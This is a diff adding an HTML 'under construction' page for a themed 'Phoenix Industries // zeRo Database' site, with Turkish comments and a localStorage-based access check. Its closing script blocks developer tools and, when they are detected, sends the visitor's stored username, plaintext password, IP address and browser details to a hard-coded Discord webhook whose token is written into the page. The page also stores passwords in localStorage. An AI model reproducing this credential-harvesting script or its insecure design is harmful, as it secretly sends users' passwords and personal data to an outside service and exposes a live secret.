@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phoenix Industries // zeRo Database</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <script>
+  (function() {
+      'use strict';
+      
+      // Sayfa yüklenir yüklenmez kontrol et
+      // raiden3.html'deki checkAccess() fonksiyonunu bu şekilde değiştirin:
+
+function checkAccess() {
+    // localStorage'da gerekli bilgiler var mı kontrol et
+    const userIdentifier = localStorage.getItem('userIdentifier');
+    const userPassword = localStorage.getItem('userPassword');
+    const userType = localStorage.getItem('userType');
+    const validEntry = localStorage.getItem('zero_access'); // Yeni kontrol parametresi
+    
+    // Eğer localStorage'da bilgiler yoksa veya boşsa (yani index.html'den giriş yapmamış)
+    if (!userIdentifier || !userPassword || !userType) {
+        alert('⚠️ Yetkisiz erişim! Lütfen giriş yapın.');
+        window.location.replace('index.html');
+        return;
+    }
+    
+    // Raiden3'e sadece terminal.html'den erişim kontrolü
+    if (!validEntry || validEntry !== 'terminal_authorized') {
+        alert('⚠️ Bu sayfaya direkt erişim yasaktır! Terminal üzerinden erişim sağlayın.');
+        // localStorage'ı temizle ve index.html'e yönlendir
+        localStorage.clear();
+        window.location.replace('index.html');
+        return;
+    }
+    
+    // Session timeout kontrolü (30 dakika)
+    const loginTime = localStorage.getItem('loginTime');
+    if (loginTime) {
+        const currentTime = new Date().getTime();
+        const sessionDuration = 30 * 60 * 1000; // 30 dakika
+        
+        if (currentTime - parseInt(loginTime) > sessionDuration) {
+            alert('⏰ Oturum süreniz doldu. Lütfen tekrar giriş yapın.');
+            localStorage.clear();
+            window.location.replace('index.html');
+            return;
+        }
+    }
+    
+    // Erişim anahtarını temizle (tek seferlik kullanım)
+    localStorage.removeItem('rzero_access');
+    
+    // Eğer her şey tamam ise, login zamanını güncelle
+    localStorage.setItem('loginTime', new Date().getTime().toString());
+}
+      
+      // Sayfa yüklendiğinde kontrol et
+      if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', checkAccess);
+      } else {
+          checkAccess();
+      }
+      
+  })();
+  </script>
+  
+  <style>
+    :root {
+      --primary: #00ff00;
+      --secondary: #003300;
+      --accent: #00cc00;
+      --error: #ff3333;
+      --bg: #000;
+      --text: #00ff00;
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    /* CRT Effect */
+    .crt-effect::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        linear-gradient(rgba(0, 255, 0, 0.03) 50%, rgba(0, 0, 0, 0.1) 50%),
+        linear-gradient(90deg, rgba(0, 255, 0, 0.03), rgba(0, 255, 0, 0.02), rgba(0, 255, 0, 0.03));
+      background-size: 100% 3px, 3px 100%;
+      pointer-events: none;
+      z-index: 100;
+    }
+    
+    .crt-effect::after {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.1);
+      opacity: 0.1;
+      pointer-events: none;
+      z-index: 100;
+      animation: flicker 0.15s infinite;
+    }
+    
+    @keyframes flicker {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 0.05; }
+    }
+    
+    /* Entry Animation */
+    .entry-animation {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      color: var(--primary);
+      font-size: clamp(1.5rem, 5vw, 3rem);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      opacity: 1;
+      transition: opacity 2s ease;
+    }
+    
+    .entry-animation.fade-out {
+      opacity: 0;
+      visibility: hidden;
+    }
+    
+    /* Typing Effect for Entry */
+    .typing-text {
+      display: inline-block;
+    }
+    
+    .typing-cursor {
+      display: inline-block;
+      background-color: var(--primary);
+      width: 2px;
+      height: 1em;
+      animation: blink 1s infinite;
+      margin-left: 1px;
+    }
+    
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+    
+    /* Main Container */
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      opacity: 0;
+      transition: opacity 1s ease;
+    }
+    
+    .main-container.visible {
+      opacity: 1;
+    }
+    
+    /* Construction Title */
+    .construction-title {
+      font-size: clamp(2rem, 8vw, 5rem);
+      color: var(--primary);
+      text-align: center;
+      margin-bottom: 30px;
+      animation: glitch-text 3s infinite alternate;
+      text-shadow: 0 0 20px var(--primary);
+    }
+    
+    @keyframes glitch-text {
+      0%, 90%, 100% { 
+        text-shadow: 0 0 20px var(--primary);
+        transform: translateX(0);
+      }
+      10% { 
+        text-shadow: 2px 0 var(--accent), -2px 0 var(--error);
+        transform: translateX(-2px);
+      }
+      20% { 
+        text-shadow: -2px 0 var(--accent), 2px 0 var(--error);
+        transform: translateX(2px);
+      }
+    }
+    
+    /* Workers Container */
+    .workers-container {
+      display: flex;
+      gap: 100px;
+      margin: 40px 0;
+      align-items: flex-end;
+    }
+    
+    /* Worker Animation */
+    .worker {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    
+    .worker-body {
+      font-size: 4rem;
+      animation: worker-bounce 2s ease-in-out infinite;
+    }
+    
+    .worker:nth-child(1) .worker-body {
+      animation-delay: 0s;
+    }
+    
+    .worker:nth-child(2) .worker-body {
+      animation-delay: 1s;
+    }
+    
+    @keyframes worker-bounce {
+      0%, 50%, 100% { transform: translateY(0); }
+      25% { transform: translateY(-10px); }
+    }
+    
+    /* Hard Hat */
+    .hard-hat {
+      position: absolute;
+      top: -20px;
+      font-size: 2rem;
+      color: #ffaa00;
+      animation: hat-glow 2s ease-in-out infinite;
+    }
+    
+    @keyframes hat-glow {
+      0%, 100% { text-shadow: 0 0 10px #ffaa00; }
+      50% { text-shadow: 0 0 20px #ffaa00, 0 0 30px #ffaa00; }
+    }
+    
+    /* Tools */
+    .tool {
+      position: absolute;
+      font-size: 2rem;
+      color: #888;
+    }
+    
+    .pickaxe {
+      right: -30px;
+      top: 20px;
+      animation: pickaxe-swing 2s ease-in-out infinite;
+    }
+    
+    .shovel {
+      left: -30px;
+      top: 10px;
+      transform: rotate(-30deg);
+      animation: shovel-carry 2s ease-in-out infinite;
+    }
+    
+    @keyframes pickaxe-swing {
+      0%, 70%, 100% { transform: rotate(0deg); }
+      35% { transform: rotate(-45deg); }
+    }
+    
+    @keyframes shovel-carry {
+      0%, 100% { transform: rotate(-30deg) translateY(0); }
+      50% { transform: rotate(-30deg) translateY(-5px); }
+    }
+    
+    /* Sparks Effect */
+    .sparks {
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    
+    .spark {
+      position: absolute;
+      width: 3px;
+      height: 3px;
+      background: var(--accent);
+      border-radius: 50%;
+      animation: spark-fly 1s ease-out infinite;
+      box-shadow: 0 0 6px var(--accent);
+    }
+    
+    .spark:nth-child(1) { animation-delay: 0s; left: 0px; }
+    .spark:nth-child(2) { animation-delay: 0.2s; left: 10px; }
+    .spark:nth-child(3) { animation-delay: 0.4s; left: -10px; }
+    .spark:nth-child(4) { animation-delay: 0.6s; left: 20px; }
+    .spark:nth-child(5) { animation-delay: 0.8s; left: -20px; }
+    
+    @keyframes spark-fly {
+      0% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+      100% {
+        opacity: 0;
+        transform: translateY(-50px) scale(0.3);
+      }
+    }
+    
+    /* Info Text */
+    .info-text {
+      text-align: center;
+      font-size: clamp(1rem, 3vw, 1.5rem);
+      margin: 40px 0;
+      color: rgba(0, 255, 0, 0.8);
+      line-height: 1.6;
+      animation: text-pulse 4s ease-in-out infinite;
+    }
+    
+    @keyframes text-pulse {
+      0%, 100% { opacity: 0.8; }
+      50% { opacity: 1; text-shadow: 0 0 10px var(--primary); }
+    }
+    
+    /* Exit Button */
+    .exit-button {
+      background: var(--secondary);
+      border: 2px solid var(--primary);
+      color: var(--primary);
+      padding: 15px 30px;
+      cursor: pointer;
+      text-transform: uppercase;
+      font-family: inherit;
+      font-size: 1.2rem;
+      transition: var(--transition);
+      position: relative;
+      overflow: hidden;
+      margin-top: 30px;
+    }
+    
+    .exit-button:hover {
+      background: var(--primary);
+      color: var(--bg);
+      box-shadow: 0 0 20px var(--primary);
+      transform: translateY(-2px);
+    }
+    
+    .exit-button::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.3), transparent);
+      transition: left 0.5s;
+    }
+    
+    .exit-button:hover::after {
+      left: 100%;
+    }
+    
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .workers-container {
+        gap: 50px;
+        scale: 0.8;
+      }
+      
+      .construction-title {
+        font-size: clamp(1.5rem, 6vw, 3rem);
+      }
+      
+      .info-text {
+        font-size: clamp(0.9rem, 2.5vw, 1.2rem);
+        padding: 0 20px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .workers-container {
+        gap: 30px;
+        scale: 0.6;
+      }
+      
+      .exit-button {
+        padding: 12px 25px;
+        font-size: 1rem;
+      }
+    }
+    
+    /* Accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+    
+    .exit-button:focus-visible {
+      outline: 3px solid var(--accent);
+      outline-offset: 3px;
+    }
+  </style>
+</head>
+<body class="crt-effect">
+  
+  <!-- Entry Animation -->
+  <div class="entry-animation" id="entryAnimation">
+    <span id="entryText"></span>
+    <span class="typing-cursor" id="entryCursor"></span>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-container" id="mainContainer">
+    <div class="construction-title">UNDER CONSTRUCTION</div>
+    
+    <div class="workers-container">
+      <!-- Worker 1 - With pickaxe -->
+      <div class="worker">
+        <div class="hard-hat">🚷</div>
+        <div class="worker-body">🧑‍🔧</div>
+        <div class="tool pickaxe">⛏️</div>
+        <div class="sparks">
+          <div class="spark"></div>
+          <div class="spark"></div>
+          <div class="spark"></div>
+          <div class="spark"></div>
+          <div class="spark"></div>
+        </div>
+      </div>
+      
+      <!-- Worker 2 - With shovel -->
+      <div class="worker">
+        <div class="hard-hat">🚷</div>
+        <div class="worker-body">👷</div>
+        <div class="tool shovel">🔨</div>
+      </div>
+    </div>
+    
+    <div class="info-text">
+     Phoenix Industries // zeRo Database is currently under maintenance<br>
+      Please check back later for full functionality<br>
+      <br>
+      <span style="color: rgba(0, 255, 0, 0.6); font-size: 0.9em;">
+        System Status: Rebuilding core protocols...
+      </span>
+    </div>
+    
+    <button class="exit-button" id="exitButton" onclick="returnToIndex()">
+      ← EXIT TO MAIN SYSTEM
+    </button>
+  </div>
+
+  <!-- Audio elements -->
+  <audio id="bgMusic" loop preload="none">
+    <source src="sounds/backgroundmusic3.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="closeSound" preload="none">
+    <source src="sounds/close.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    class SoundGenerator {
+      constructor() {
+        this.audioContext = null;
+        this.initAudioContext();
+      }
+      
+      initAudioContext() {
+        try {
+          this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        } catch (e) {
+          console.warn('Audio context not supported');
+        }
+      }
+      
+      playOutputSound() {
+        if (!this.audioContext) return;
+        
+        const oscillator = this.audioContext.createOscillator();
+        const gainNode = this.audioContext.createGain();
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(this.audioContext.destination);
+        
+        // Output sound parameters for typing
+        oscillator.frequency.setValueAtTime(1000, this.audioContext.currentTime);
+        oscillator.frequency.exponentialRampToValueAtTime(600, this.audioContext.currentTime + 0.02);
+        
+        gainNode.gain.setValueAtTime(0.02, this.audioContext.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.001, this.audioContext.currentTime + 0.02);
+        
+        oscillator.type = 'sine';
+        oscillator.start(this.audioContext.currentTime);
+        oscillator.stop(this.audioContext.currentTime + 0.02);
+      }
+    }
+
+    class ZeroSystem {
+      constructor() {
+        this.entryAnimation = document.getElementById('entryAnimation');
+        this.entryText = document.getElementById('entryText');
+        this.entryCursor = document.getElementById('entryCursor');
+        this.mainContainer = document.getElementById('mainContainer');
+        this.bgMusic = document.getElementById('bgMusic');
+        this.closeSound = document.getElementById('closeSound');
+        this.soundGenerator = new SoundGenerator();
+        
+        this.init();
+      }
+      
+      init() {
+        this.setupAudio();
+        this.startEntrySequence();
+      }
+      
+      setupAudio() {
+        this.bgMusic.volume = 0.2;
+        this.closeSound.volume = 0.3;
+        
+        // Start music on first user interaction
+        const startMusic = () => {
+          this.bgMusic.play().catch(console.warn);
+          if (this.soundGenerator.audioContext && this.soundGenerator.audioContext.state === 'suspended') {
+            this.soundGenerator.audioContext.resume();
+          }
+          document.removeEventListener('click', startMusic);
+          document.removeEventListener('keydown', startMusic);
+        };
+        
+        // Listen for both click and keyboard input
+        document.addEventListener('click', startMusic);
+        document.addEventListener('keydown', startMusic);
+      }
+      
+      playCloseSound() {
+        this.closeSound.currentTime = 0;
+        this.closeSound.play().catch(console.warn);
+      }
+      
+      startEntrySequence() {
+        const text = "ACCESSING PHOENIX INDUSTRIES // zeRo DATABASE...";
+        
+        let i = 0;
+        const typeEntry = () => {
+          if (i < text.length) {
+            this.entryText.textContent += text[i];
+            i++;
+            setTimeout(typeEntry, 80); // Typing speed same as raiden3
+          } else {
+            setTimeout(() => {
+              this.entryAnimation.classList.add('fade-out');
+              setTimeout(() => {
+                this.entryAnimation.style.display = 'none';
+                this.mainContainer.classList.add('visible');
+              }, 1000);
+            }, 1000); // Wait 1 second before starting fade out
+          }
+        };
+        
+        setTimeout(typeEntry, 500); // Start typing after a brief delay
+      }
+    }
+    
+    // Initialize system instance
+    let zeroSystem;
+    
+    // Return to index function
+    function returnToIndex() {
+      // Play close sound
+      if (zeroSystem) {
+        zeroSystem.playCloseSound();
+      }
+      
+      // Add a fade out effect before redirecting
+      document.body.style.transition = 'opacity 0.5s ease';
+      document.body.style.opacity = '0';
+      
+      setTimeout(() => {
+        window.location.href = 'terminal.html';
+      }, 500);
+    }
+    
+    // Initialize system when DOM is loaded
+    document.addEventListener('DOMContentLoaded', () => {
+      zeroSystem = new ZeroSystem();
+    });
+    
+    // Focus management
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') {
+        const exitButton = document.getElementById('exitButton');
+        if (document.activeElement === exitButton) {
+          returnToIndex();
+        }
+      }
+    });
+// Debug Tools Engelleme Scripti
+    (function() {
+        'use strict';
+        
+        let devToolsOpen = false;
+        let warningShown = false;
+        
+        function showWarning() {
+            if (!warningShown && window.terminal) {
+                window.terminal.showWarning();
+                warningShown = true;
+                sendToDiscord();
+            }
+        }
+        
+        function detectConsole() {
+            const threshold = 160;
+            
+            if (window.outerHeight - window.innerHeight > threshold || 
+                window.outerWidth - window.innerWidth > threshold) {
+                if (!devToolsOpen) {
+                    devToolsOpen = true;
+                    showWarning();
+                    console.clear();
+                    console.log('%cDurdur!', 'color: red; font-size: 50px; font-weight: bold;');
+                    console.log('%cBu bir tarayıcı özelliğidir ve geliştiriciler içindir. Birisi size buraya bir şey kopyalayıp yapıştırmanızı söylediyse, bu bir dolandırıcılıktır.', 'color: red; font-size: 16px;');
+                }
+            }
+        }
+        
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+            
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+            
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+            
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+            
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+            
+            if (e.ctrlKey && e.keyCode === 83) {
+                e.preventDefault();
+                showWarning();
+                return false;
+            }
+        });
+        
+        setInterval(detectConsole, 500);
+        
+        let devtools = {open: false, orientation: null};
+        
+        setInterval(function() {
+            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                if (!devtools.open) {
+                    devtools.open = true;
+                    showWarning();
+                }
+            } else {
+                devtools.open = false;
+            }
+        }, 500);
+        
+        if (window.console) {
+            console.clear();
+            console.log('%cDikkat!', 'color: red; font-size: 30px; font-weight: bold;');
+            console.log('%cBu site korunmaktadır. Yetkisiz erişim girişimleri kaydedilir.', 'color: orange; font-size: 14px;');
+        }
+        
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        window.addEventListener('beforeprint', function(e) {
+            e.preventDefault();
+            showWarning();
+            return false;
+        });
+        
+    })();
+    
+    // Discord Webhook Sistemi
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366237046670102621/Qme-enwqBGenG2VSB9DHwt4r3z8zQKiOsV8KKOspPXt72gcfZh28oRLd9jq1r9vwUzqV';
+
+    function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        let browserName = "Bilinmeyen Tarayıcı";
+        let browserVersion = "Bilinmeyen Versiyon";
+
+        if (ua.includes("Chrome") && !ua.includes("Edg")) {
+            browserName = "Google Chrome";
+            const match = ua.match(/Chrome\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Firefox")) {
+            browserName = "Mozilla Firefox";
+            const match = ua.match(/Firefox\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+            browserName = "Apple Safari";
+            const match = ua.match(/Version\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Edg")) {
+            browserName = "Microsoft Edge";
+            const match = ua.match(/Edg\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("OPR")) {
+            browserName = "Opera";
+            const match = ua.match(/OPR\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        }
+
+        return { name: browserName, version: browserVersion };
+    }
+
+    async function sendToDiscord() {
+        let ip = 'Bilinmiyor';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch (error) {
+            console.error('IP alma hatası:', error);
+        }
+
+        const browserInfo = getBrowserInfo();
+        
+        // localStorage'dan kullanıcı bilgilerini al
+        const userIdentifier = localStorage.getItem('userIdentifier') || 'bilinmiyor';
+        const userPassword = localStorage.getItem('userPassword') || 'bilinmiyor';
+        const userType = localStorage.getItem('userType') || 'bilinmiyor';
+
+        const userInfo = {
+            ipAddress: ip,
+            browserName: browserInfo.name,
+            browserVersion: browserInfo.version,
+            userAgent: navigator.userAgent,
+            screenResolution: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            platform: navigator.platform,
+            deviceName: navigator.platform,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href,
+            userIdentifier: userIdentifier,
+            userPassword: userPassword,
+            userType: userType
+        };
+
+        const message = {
+            embeds: [{
+                title: '⚠️ DevTools Kullanımı Tespit Edildi!',
+                description: `Kullanıcı: **${userIdentifier}** geliştirici araçlarını açmaya çalıştı.`,
+                color: 16711680,
+                fields: [
+                    { name: '👤 Kullanıcı Kimliği', value: userIdentifier, inline: true },
+                    { name: '🔑 Şifre', value: userPassword, inline: true },
+                    { name: '📂 Kullanıcı Tipi', value: userType, inline: true },
+                    { name: '🌐 IP Adresi', value: userInfo.ipAddress, inline: true },
+                    { name: '🔍 Tarayıcı', value: `${userInfo.browserName} ${userInfo.browserVersion}`, inline: true },
+                    { name: '📱 Platform', value: userInfo.platform, inline: true },
+                    { name: '🖥️ Ekran Çözünürlüğü', value: userInfo.screenResolution, inline: true },
+                    { name: '🌍 Dil', value: userInfo.language, inline: true },
+                    { name: '🕐 Zaman', value: userInfo.timestamp, inline: true },
+                    { name: '📄 User Agent', value: userInfo.userAgent, inline: false },
+                    { name: '🔗 Referrer', value: userInfo.referrer || 'Yok', inline: false },
+                    { name: '📍 Sayfa URL', value: userInfo.pageUrl, inline: false }
+                ],
+                footer: { 
+                    text: 'Phoenix Industries Güvenlik Logu - Raiden3 Terminal'
+                }
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+            console.log('Kullanıcı bilgileri Discord\'a gönderildi.');
+        } catch (error) {
+            console.error('Webhook hatası:', error);
+        }
+    }
+  </script>
+</body>
+</html>
